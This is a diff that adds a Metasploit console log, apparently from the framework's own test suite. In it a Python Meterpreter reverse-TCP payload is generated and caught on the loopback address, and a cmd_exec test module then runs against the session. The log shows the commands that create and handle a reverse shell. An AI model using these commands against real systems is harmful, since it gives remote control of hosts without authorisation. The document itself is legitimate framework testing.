@@ -1,0 +1,32 @@
+use python/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220203-3362-c3gfk.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6002 lhost=127.0.0.1
+[*] Writing 493 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220203-3362-c3gfk.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:49327 ) at 2022-02-03 22:56:38 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=2 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[*] Running against session 2
+[*] Session type is meterpreter and platform is osx
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+expected: lWBj - [108, 87, 66, 106]
+actual: lWBj - [108, 87, 66, 106]
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+[+] should return the stderr output
+[*] Starting cmd_exec tests
+[+] should return the result of echo
+[-] FAILED: should return the full response after sleeping
+[+] should return the full response after sleeping
+[+] should return the result of echo 10 times
+[*] Finished cmd_exec tests
+[*] Testing complete in 6.072393
+[-] Passed: 6; Failed: 1
+[*] Post module execution completed
